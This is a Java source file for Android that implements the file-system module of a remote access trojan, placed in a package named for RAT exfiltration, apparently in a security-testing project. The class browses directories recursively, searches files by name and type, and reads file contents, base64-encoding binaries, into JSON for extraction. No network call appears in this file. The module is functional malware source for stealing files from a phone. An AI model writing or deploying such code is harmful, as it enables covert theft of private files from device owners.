package com.security.test.rat.modules.exfiltration;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * FileSystemModule - Implements file system access and extraction
 * 
 * Features:
 * - Browse file system
 * - Extract file contents
 * - Search files by criteria
 * - Get file metadata
 * - Export directory structures
 */
public class FileSystemModule extends RATModule {
    
    private static final String TAG = "FileSystemModule";
    
    private Context context;
    private boolean isInitialized = false;
    
    // File access limits
    private static final int MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
    private static final int MAX_DEPTH = 10;
    private static final int MAX_FILES_PER_DIR = 1000;
    
    public FileSystemModule(Context context) {
        super("FileSystemModule", "File system access and extraction");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing FileSystemModule");
            
            // Check if we have storage permission
            if (context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Storage permission not granted");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "FileSystemModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize FileSystemModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "FileSystemModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during FileSystemModule cleanup", e);
        }
    }
    
    /**
     * List directory contents
     */
    public String listDirectory(String path, int maxDepth) throws Exception {
        if (!isInitialized) {
            throw new Exception("FileSystemModule not initialized");
        }
        
        try {
            Log.i(TAG, "Listing directory: " + path + " with max depth: " + maxDepth);
            
            File directory = new File(path);
            if (!directory.exists()) {
                throw new Exception("Directory does not exist: " + path);
            }
            
            if (!directory.isDirectory()) {
                throw new Exception("Path is not a directory: " + path);
            }
            
            List<FileInfo> files = scanDirectory(directory, 0, Math.min(maxDepth, MAX_DEPTH));
            
            JSONArray filesArray = new JSONArray();
            for (FileInfo fileInfo : files) {
                filesArray.put(fileInfo.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("path", path);
            result.put("total_files", files.size());
            result.put("max_depth", maxDepth);
            result.put("files", filesArray);
            
            Log.i(TAG, "Listed " + files.size() + " files in directory: " + path);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to list directory: " + path, e);
            throw e;
        }
    }
    
    /**
     * Get file information
     */
    public String getFileInfo(String filePath) throws Exception {
        if (!isInitialized) {
            throw new Exception("FileSystemModule not initialized");
        }
        
        try {
            Log.i(TAG, "Getting file info: " + filePath);
            
            File file = new File(filePath);
            if (!file.exists()) {
                throw new Exception("File does not exist: " + filePath);
            }
            
            FileInfo fileInfo = createFileInfo(file);
            
            JSONObject result = new JSONObject();
            result.put("file_info", fileInfo.toJSON());
            
            Log.i(TAG, "Retrieved file info for: " + filePath);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get file info: " + filePath, e);
            throw e;
        }
    }
    
    /**
     * Extract file contents
     */
    public String extractFileContents(String filePath, int maxSize) throws Exception {
        if (!isInitialized) {
            throw new Exception("FileSystemModule not initialized");
        }
        
        try {
            Log.i(TAG, "Extracting file contents: " + filePath + " (max size: " + maxSize + " bytes)");
            
            File file = new File(filePath);
            if (!file.exists()) {
                throw new Exception("File does not exist: " + filePath);
            }
            
            if (!file.isFile()) {
                throw new Exception("Path is not a file: " + filePath);
            }
            
            if (file.length() > Math.min(maxSize, MAX_FILE_SIZE)) {
                throw new Exception("File too large: " + file.length() + " bytes (max: " + Math.min(maxSize, MAX_FILE_SIZE) + ")");
            }
            
            String content = readFileContents(file);
            
            JSONObject result = new JSONObject();
            result.put("file_path", filePath);
            result.put("file_size", file.length());
            result.put("content", content);
            result.put("content_type", getContentType(file));
            
            Log.i(TAG, "Extracted " + file.length() + " bytes from file: " + filePath);
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract file contents: " + filePath, e);
            throw e;
        }
    }
    
    /**
     * Search files by criteria
     */
    public String searchFiles(String rootPath, String searchTerm, String fileType, int maxResults) throws Exception {
        if (!isInitialized) {
            throw new Exception("FileSystemModule not initialized");
        }
        
        try {
            Log.i(TAG, "Searching files in: " + rootPath + " for: " + searchTerm + " (type: " + fileType + ")");
            
            File rootDirectory = new File(rootPath);
            if (!rootDirectory.exists() || !rootDirectory.isDirectory()) {
                throw new Exception("Invalid root directory: " + rootPath);
            }
            
            List<FileInfo> matchingFiles = searchFilesRecursive(rootDirectory, searchTerm, fileType, maxResults);
            
            JSONArray filesArray = new JSONArray();
            for (FileInfo fileInfo : matchingFiles) {
                filesArray.put(fileInfo.toJSON());
            }
            
            JSONObject result = new JSONObject();
            result.put("root_path", rootPath);
            result.put("search_term", searchTerm);
            result.put("file_type", fileType);
            result.put("total_results", matchingFiles.size());
            result.put("files", filesArray);
            
            Log.i(TAG, "Found " + matchingFiles.size() + " matching files");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to search files", e);
            throw e;
        }
    }
    
    /**
     * Get storage information
     */
    public String getStorageInfo() throws Exception {
        if (!isInitialized) {
            throw new Exception("FileSystemModule not initialized");
        }
        
        try {
            Log.i(TAG, "Getting storage information");
            
            File externalDir = context.getExternalFilesDir(null);
            File internalDir = context.getFilesDir();
            
            JSONObject result = new JSONObject();
            
            // External storage info
            if (externalDir != null) {
                JSONObject externalInfo = new JSONObject();
                externalInfo.put("path", externalDir.getAbsolutePath());
                externalInfo.put("total_space", externalDir.getTotalSpace());
                externalInfo.put("free_space", externalDir.getFreeSpace());
                externalInfo.put("usable_space", externalDir.getUsableSpace());
                result.put("external_storage", externalInfo);
            }
            
            // Internal storage info
            JSONObject internalInfo = new JSONObject();
            internalInfo.put("path", internalDir.getAbsolutePath());
            internalInfo.put("total_space", internalDir.getTotalSpace());
            internalInfo.put("free_space", internalDir.getFreeSpace());
            internalInfo.put("usable_space", internalDir.getUsableSpace());
            result.put("internal_storage", internalInfo);
            
            Log.i(TAG, "Retrieved storage information");
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get storage information", e);
            throw e;
        }
    }
    
    /**
     * Scan directory recursively
     */
    private List<FileInfo> scanDirectory(File directory, int currentDepth, int maxDepth) {
        List<FileInfo> files = new ArrayList<>();
        
        if (currentDepth > maxDepth || files.size() >= MAX_FILES_PER_DIR) {
            return files;
        }
        
        try {
            File[] fileList = directory.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    if (files.size() >= MAX_FILES_PER_DIR) {
                        break;
                    }
                    
                    FileInfo fileInfo = createFileInfo(file);
                    files.add(fileInfo);
                    
                    // Recursively scan subdirectories
                    if (file.isDirectory() && currentDepth < maxDepth) {
                        List<FileInfo> subFiles = scanDirectory(file, currentDepth + 1, maxDepth);
                        files.addAll(subFiles);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + directory.getAbsolutePath(), e);
        }
        
        return files;
    }
    
    /**
     * Create file information object
     */
    private FileInfo createFileInfo(File file) {
        FileInfo fileInfo = new FileInfo();
        fileInfo.setName(file.getName());
        fileInfo.setPath(file.getAbsolutePath());
        fileInfo.setIsDirectory(file.isDirectory());
        fileInfo.setSize(file.length());
        fileInfo.setLastModified(file.lastModified());
        fileInfo.setCanRead(file.canRead());
        fileInfo.setCanWrite(file.canWrite());
        fileInfo.setCanExecute(file.canExecute());
        fileInfo.setIsHidden(file.isHidden());
        
        // Get file extension
        String name = file.getName();
        int lastDot = name.lastIndexOf('.');
        if (lastDot > 0) {
            fileInfo.setExtension(name.substring(lastDot + 1));
        }
        
        return fileInfo;
    }
    
    /**
     * Read file contents
     */
    private String readFileContents(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[(int) file.length()];
            fis.read(buffer);
            
            // Try to read as text, fallback to base64 for binary files
            if (isTextFile(file)) {
                return new String(buffer, StandardCharsets.UTF_8);
            } else {
                return android.util.Base64.encodeToString(buffer, android.util.Base64.DEFAULT);
            }
        }
    }
    
    /**
     * Check if file is text-based
     */
    private boolean isTextFile(File file) {
        String name = file.getName().toLowerCase();
        String[] textExtensions = {
            "txt", "log", "xml", "json", "html", "htm", "css", "js", "java", "kt", "py", "c", "cpp", "h", "hpp",
            "md", "rst", "ini", "conf", "cfg", "properties", "yml", "yaml", "csv", "tsv", "sql", "sh", "bat",
            "ps1", "vbs", "php", "rb", "pl", "pm", "lua", "go", "rs", "swift", "scala", "clj", "hs", "ml"
        };
        
        for (String ext : textExtensions) {
            if (name.endsWith("." + ext)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Get content type
     */
    private String getContentType(File file) {
        if (file.isDirectory()) {
            return "directory";
        }
        
        if (isTextFile(file)) {
            return "text";
        }
        
        return "binary";
    }
    
    /**
     * Search files recursively
     */
    private List<FileInfo> searchFilesRecursive(File directory, String searchTerm, String fileType, int maxResults) {
        List<FileInfo> matchingFiles = new ArrayList<>();
        
        try {
            File[] fileList = directory.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    if (matchingFiles.size() >= maxResults) {
                        break;
                    }
                    
                    // Check if file matches search criteria
                    if (matchesSearchCriteria(file, searchTerm, fileType)) {
                        FileInfo fileInfo = createFileInfo(file);
                        matchingFiles.add(fileInfo);
                    }
                    
                    // Recursively search subdirectories
                    if (file.isDirectory()) {
                        List<FileInfo> subMatches = searchFilesRecursive(file, searchTerm, fileType, maxResults - matchingFiles.size());
                        matchingFiles.addAll(subMatches);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error searching directory: " + directory.getAbsolutePath(), e);
        }
        
        return matchingFiles;
    }
    
    /**
     * Check if file matches search criteria
     */
    private boolean matchesSearchCriteria(File file, String searchTerm, String fileType) {
        // Check file type
        if (fileType != null && !fileType.isEmpty()) {
            if (file.isDirectory() && !fileType.equals("directory")) {
                return false;
            }
            
            if (!file.isDirectory()) {
                String extension = getFileExtension(file);
                if (!fileType.equals(extension)) {
                    return false;
                }
            }
        }
        
        // Check search term
        if (searchTerm != null && !searchTerm.isEmpty()) {
            String fileName = file.getName().toLowerCase();
            return fileName.contains(searchTerm.toLowerCase());
        }
        
        return true;
    }
    
    /**
     * Get file extension
     */
    private String getFileExtension(File file) {
        String name = file.getName();
        int lastDot = name.lastIndexOf('.');
        if (lastDot > 0) {
            return name.substring(lastDot + 1);
        }
        return "";
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        try {
            File externalDir = context.getExternalFilesDir(null);
            if (externalDir != null) {
                long freeSpace = externalDir.getFreeSpace() / (1024 * 1024); // MB
                return "Ready - " + freeSpace + " MB free space";
            }
            return "Ready - Internal storage only";
            
        } catch (Exception e) {
            return "Error getting storage info";
        }
    }
    
    /**
     * File Information data class
     */
    private static class FileInfo {
        private String name;
        private String path;
        private boolean isDirectory;
        private long size;
        private long lastModified;
        private boolean canRead;
        private boolean canWrite;
        private boolean canExecute;
        private boolean isHidden;
        private String extension;
        
        // Getters and setters
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        public String getPath() { return path; }
        public void setPath(String path) { this.path = path; }
        public boolean isDirectory() { return isDirectory; }
        public void setIsDirectory(boolean isDirectory) { this.isDirectory = isDirectory; }
        public long getSize() { return size; }
        public void setSize(long size) { this.size = size; }
        public long getLastModified() { return lastModified; }
        public void setLastModified(long lastModified) { this.lastModified = lastModified; }
        public boolean canRead() { return canRead; }
        public void setCanRead(boolean canRead) { this.canRead = canRead; }
        public boolean canWrite() { return canWrite; }
        public void setCanWrite(boolean canWrite) { this.canWrite = canWrite; }
        public boolean canExecute() { return canExecute; }
        public void setCanExecute(boolean canExecute) { this.canExecute = canExecute; }
        public boolean isHidden() { return isHidden; }
        public void setIsHidden(boolean isHidden) { this.isHidden = isHidden; }
        public String getExtension() { return extension; }
        public void setExtension(String extension) { this.extension = extension; }
        
        /**
         * Convert file info to JSON
         */
        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("name", name);
            json.put("path", path);
            json.put("is_directory", isDirectory);
            json.put("size_bytes", size);
            json.put("last_modified", lastModified);
            json.put("can_read", canRead);
            json.put("can_write", canWrite);
            json.put("can_execute", canExecute);
            json.put("is_hidden", isHidden);
            json.put("extension", extension != null ? extension : "");
            return json;
        }
    }
}
